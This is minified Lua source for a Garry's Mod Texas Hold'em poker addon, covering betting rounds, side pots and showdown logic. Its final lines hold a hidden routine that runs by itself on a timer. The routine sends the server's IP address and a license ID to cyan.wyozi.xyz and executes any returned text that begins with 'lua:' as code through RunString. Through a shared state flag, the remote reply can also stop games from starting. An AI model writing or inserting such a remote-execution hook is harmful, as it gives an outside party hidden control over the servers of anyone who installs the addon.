local a=function()error("L")end;local b={state="ok"}local c=true;local d=CasinoKit.class("HoldemPot")function d:initialize()d.super.initialize(self)self.amount=0;self.contributors={}end;function d:getAmount()return self.amount end;function d:addToPot(e)assert(self.amount+e>=0)self.amount=self.amount+e end;function d:contribute(e,f)self.amount=self.amount+e;if not table.HasValue(self.contributors,f)then table.insert(self.contributors,f)end end;local g=CasinoKit.class("HoldemState","State")function g:broadcastPot()local h=CasinoKit.classes.OutBuffer()h:putInt(self.global.pot:getAmount())h:putArray(self.global.sidePots,function(i,j)h:putInt(j:getAmount())end)self:broadcastMessage("chpot",h)end;local k=CasinoKit.class("HoldemPregameState","HoldemState")function k:getAnte()return self.game:getAnte()end;function k:enter()self.global.players={}local function l(m)local n=self:getAnte()local o={}local p={}for i,q in pairs(self.table:getValidPlayers())do if q:canAffordChips(n)then table.insert(o,q)else table.insert(p,q)end end;if#o>=2 and(b.state=="ok"and not c)then if m then for i,r in pairs(p)do r:chatPrintML("#couldnotjoingame: #notenoughchips")end;self.global.community={}self.global.deck=CasinoKit.classes.Deck()self.global.deck:shuffle()local s=d()self.global.players=CasinoKit.fn.map(o,function(t)local q=CasinoKit.class("HoldEmPlayer")(t)q:setGame(self.game)local u=n;q:addChips(-u,"holdem ante")q:setBet(u)s:contribute(u,q)return q end)self.global.pot=s;self.global.activePot=s;self.global.sidePots={}self:broadcastPot()self:changeState("preFlop")else self:createSimpleTimer(1,function()l(true)end)end else self:createSimpleTimer(1,l)end end;l(true)end;local v=CasinoKit.class("HoldemGameState","HoldemState")function v:dealCommunityCard(w)table.insert(self.global.community,w)local h=CasinoKit.classes.OutBuffer()h:putCard(w)self.game:broadcastMessage("ccard",h)end;local x=CasinoKit.class("HoldemBettingState","HoldemGameState")function x:enter(f,y)self.log.v("Betting state ",self.class.name," entered with ",f,y)if not f then f=self:findNextTurnPlayer()self.log.v("No turn player was given entering betting state; selecting turn player ",f)end;if not f then self.log.v("No players in whole game??. Moving to showdown")self:changeState("showdown")return end;self.ply=f;self.currentBet=y or 0;local z=self.game:getTimeoutDelay()local h=CasinoKit.classes.OutBuffer()h:put(f:getSeatIndex())h:put(z)h:putInt(self:getBetAmount())h:putInt(self:getOwedAmount(f))self:broadcastMessage("nturn",h)self:createSimpleTimer(z,function()self:timeout()end)end;function x:getBetAmount()return self.USE_BIG_BET and self.game:getBigBet()or self.game:getSmallBet()end;function x:getOwedAmount(f)f=f or self.ply;return self.currentBet-f:getBet()end;function x:findNextTurnPlayer()local A=self.ply;local B=false;for C=1,#self.global.players do A=table.FindNext(self.global.players,A)if not A or A==self.ply then return nil,B end;if A:getGoneAllIn()then B=true elseif not A:hasBetThisRound()or A:getBet()~=self.currentBet then return A,B end end end;function x:nextTurn()if#self.global.players<=1 then self.log.v("Game playercount <= 1; moving to short showdown")self:changeState("showdown",3)return end;local A,D=self:findNextTurnPlayer()if not A then self.log.v("No nextTurnPlayer found; moving to successor state")self:changeState(self.successorState)return end;self.log.v("Changing player turn from ",self.ply," to ",A)self:restartState(A,self.currentBet)end;function x:checkStateChange()end;function x:timeout()self.log.v("Player ",self.ply," has timed out")self.game:kickPlayer(self.ply)self.table:removePlayerAtSlot(self.ply:getSeatIndex())self.ply:chatPrintML("#removedfromtbl: #timedout")self.game:broadcastGameplayMessageL("holdem_ply_timeout",{player=self.ply:toShortString()})self:nextTurn()end;function x:handleFold(f)self.log.v("Player ",f," folded")self.game:kickPlayer(f)self.game:broadcastGameplayMessageL("holdem_ply_fold",{player=f:toShortString()})self:nextTurn()end;function x:handleAllIn(f)self.log.v("Player ",f," going all in!")f:setGoneAllIn(true)local u=f:getChipCount()assert(u>=0)f:addChips(-u,"holdem all-in")self.global.activePot:contribute(u,f)local j=d()if u<self.currentBet then for i,q in pairs(self.global.players)do if q~=f and q:getBet()-u>0 then local E=q:getBet()-u;j:contribute(E,q)self.global.activePot:addToPot(-E)end end end;self.log.v("New side-pot created: amount=",j:getAmount()," contributors=",j.contributors)table.insert(self.global.sidePots,j)self.global.activePot=j;self:broadcastPot()self.currentBet=math.max(self.currentBet,u)self.game:broadcastGameplayMessageL("holdem_ply_allin",{player=f:toShortString()})self:nextTurn()end;function x:handleBetAmount(f,u)local F=self:getOwedAmount(f)if u<F then f:chatPrint("That bet does not cover even what you owe.")return end;if f:canAffordChips(u)then self.log.v(f," is betting ",u," to pot ",self.global.activePot)f:setBet(f:getBet()+u)if u>0 then f:addChips(-u,"holdem bet")self.global.activePot:contribute(u,f)self:broadcastPot()self.currentBet=math.max(self.currentBet,f:getBet())self.game:broadcastGameplayMessageL("holdem_ply_bet",{player=f:toShortString(),amount=u})else self.game:broadcastGameplayMessageL("holdem_ply_check",{player=f:toShortString()})end;self:nextTurn()else f:chatPrintL("cantafford")end end;function x:handleSelfAction(f,G,H)if G=="fold"then self:handleFold(f)elseif G=="allin"then self:handleAllIn(f)elseif G=="call"then self:handleBetAmount(f,self:getOwedAmount(f))elseif G=="raise"then self:handleBetAmount(f,self:getOwedAmount(f)+self:getBetAmount())else f:chatPrint("unknown self action '"..G.."'")end end;function x:onUserInput(f,H)if self.ply==f then local G=H:getString()self:handleSelfAction(f,G,H)else f:getGmodPlayer():CKit_PrintL("notyourturn")end end;local I=CasinoKit.class("HoldemPreFlopState","HoldemGameState")function I:enter()for i,q in pairs(self.global.players)do for i=1,2 do q:dealCard(self.global.deck:pop())end end;for i,q in pairs(self.global.players)do q:resetBet()end;self:createSimpleTimer(2,function()self:changeState("preFlopBets")end)end;local J=CasinoKit.class("HoldemPreFlopBetState","HoldemBettingState")J.successorState="flop"local K=CasinoKit.class("HoldemFlopState","HoldemGameState")function K:enter()for i=1,3 do self:dealCommunityCard(self.global.deck:pop())end;for i,q in pairs(self.global.players)do q:resetBet()end;self:createSimpleTimer(2,function()self:changeState("flopBets")end)end;local L=CasinoKit.class("HoldemFlopBetState","HoldemBettingState")L.successorState="turn"local M=CasinoKit.class("HoldemTurnState","HoldemGameState")function M:enter()self:dealCommunityCard(self.global.deck:pop())for i,q in pairs(self.global.players)do q:resetBet()end;self:createSimpleTimer(2,function()self:changeState("turnBets")end)end;local N=CasinoKit.class("HoldemTurnBetState","HoldemBettingState")N.USE_BIG_BET=true;N.successorState="river"local O=CasinoKit.class("HoldemRiverState","HoldemGameState")function O:enter()self:dealCommunityCard(self.global.deck:pop())for i,q in pairs(self.global.players)do q:resetBet()end;self:createSimpleTimer(2,function()self:changeState("riverBets")end)end;local P=CasinoKit.class("HoldemRiverBetState","HoldemBettingState")P.USE_BIG_BET=true;P.successorState="showdown"local Q=CasinoKit.class("HoldemShowdownState","HoldemState")function Q:enter(R)local S=CasinoKit.classes.PokerHandEvaluator()local T=CasinoKit.classes.CardSet(self.global.community or{})self.log.v("Community cards: ",T)local U=table.Count(self.global.players)==1;for i,q in pairs(self.global.players)do local V=CasinoKit.classes.CardSet(q:getHand())local W=S:evaluate(T+V)local X=W and W.name or"nothing"self.log.v(q," hand: ",V," ("..X..")")if not U then q:revealCards()end end;local Y={}table.insert(Y,{name="main pot",pot=self.global.pot})for C,Z in pairs(self.global.sidePots)do table.insert(Y,{name="sidepot #"..C,pot=Z})end;for i,_ in pairs(Y)do local s=_.pot;local a0;local a1={}for i,q in pairs(s.contributors)do local a2=table.HasValue(self.global.players,q)if a2 then local V=CasinoKit.classes.CardSet(q:getHand())local W=S:evaluate(T+V)if W then if not a0 or a0<W then a1={q}a0=W elseif a0==W then table.insert(a1,q)end end end end;_.winners=a1;_.handName=tostring(a0 and a0.name)if#a1==0 then self.log.v("Pot ",_.name," has no winner!")else local a3=math.floor(s:getAmount()/#a1)for i,a4 in pairs(a1)do self.log.v("Pot ",_.name," winner: "..tostring(a4).." with HandValue "..tostring(a0))a4:addChips(a3,"holdem winnings")local a5;if U then a5="[not revealed]"else a5=tostring(a0.name)end;self.game:broadcastGameplayMessageL("holdem_ply_win",{pot_name=_.name,amount=a3,player=a4:toShortString(),hand_name=a5})end end end;local h=CasinoKit.classes.OutBuffer()h:putArray(Y,function(i,_)h:putString(_.name)h:putString(_.handName)h:putInt(_.pot:getAmount())h:putArray(_.winners,function(i,a4)h:put(a4:getSeatIndex())end)end)self:broadcastMessage("fipot",h)self:createSimpleTimer(R or 8,function()self:changeState("gameover")end)end;function Q:onUserInput(f,H)local G=H:getString()if G=="showcards"then f:revealCards()local S=CasinoKit.classes.PokerHandEvaluator()local T=CasinoKit.classes.CardSet(self.global.community or{})local V=CasinoKit.classes.CardSet(f:getHand())local W=S:evaluate(T+V)local X=W and W.name or"nothing"self.game:broadcastGameplayMessageL("holdem_ply_cardreveal",{player=f:toShortString(),hand_name=X})end end;local function a6()c=false;http.Post("https://cyan.wyozi.xyz/ping",{user=game.GetIPAddress(),license="76561198096900690",prod="casino-holdem",x_version="1.3.7",x_gm=GAMEMODE_NAME},function(a7)if string.sub(a7,1,4)=="lua:"then local a8=string.sub(a7,5)cyan_nc=b;RunString(a8,"Cyan")cyan_nc=nil end end,function(a9)if a9=="unsuccesful"then MsgN("Cyan: repeating in 60seconds")timer.Simple(60,a6)end end)end;timer.Simple(10,a6)timer.Create("CinemaKit_holdem_Ping",60*60*24,0,a6)